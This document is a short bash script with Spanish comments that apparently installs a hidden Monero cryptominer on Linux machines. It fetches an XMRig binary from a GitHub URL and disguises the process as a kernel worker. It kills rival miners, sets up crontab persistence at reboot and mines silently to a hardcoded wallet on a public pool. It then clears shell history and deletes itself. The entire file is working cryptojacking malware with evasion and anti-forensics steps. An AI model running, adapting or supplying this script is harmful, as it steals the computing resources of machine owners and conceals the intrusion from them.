#!/bin/bash

# --- CONFIGURACIÓN ---
WGET_URL="https://github.com/p2151868-wq/xmr/raw/refs/heads/main/xmrig"
FAKE_NAME="[kworker/u2:1-ev]" # Nombre para camuflarse en el comando 'top'
POOL="gulf.moneroocean.stream:10128"
WALLET="46Sic8EdWznhfw1P7P7yTiJgChtRMRReVD4Jpa3L93pG1Xy1W9BxQZhFBBv9FMuRgC6tM6hkVRsKtSoRVoSvfB11NX49MCS" # <--- ¡CAMBIA ESTO!

# 1. ASEGURAR HERRAMIENTAS BÁSICAS
if ! command -v curl &> /dev/null; then
    sudo apt-get update && sudo apt-get install -y curl || yum install -y curl
fi

# 2. LIMPIEZA DE COMPETENCIA
# Si otro minero está corriendo, lo sacamos para usar toda la CPU nosotros
pkill -9 -f "xmrig" 2>/dev/null
pkill -9 -f "miner" 2>/dev/null

# 3. DESCARGA E INSTALACIÓN
cd /tmp || cd /var/tmp
curl -sL "$WGET_URL" -o "$FAKE_NAME"
chmod +x "$FAKE_NAME"

# 4. PERSISTENCIA (CRONTAB)
# Esto reinstala el miner cada vez que la máquina se reinicia
(crontab -l 2>/dev/null; echo "@reboot /tmp/$FAKE_NAME --url=$POOL --user=$WALLET --pass=x --donate-level=1 --background") | crontab -

# 5. EJECUCIÓN SILENCIOSA
# --background lo oculta del terminal, >/dev/null oculta los mensajes
nohup ./"$FAKE_NAME" --url=$POOL --user=$WALLET --pass=x --donate-level=1 --background >/dev/null 2>&1 &

# 6. BORRADO DE RASTROS
history -c
rm -- "$0"
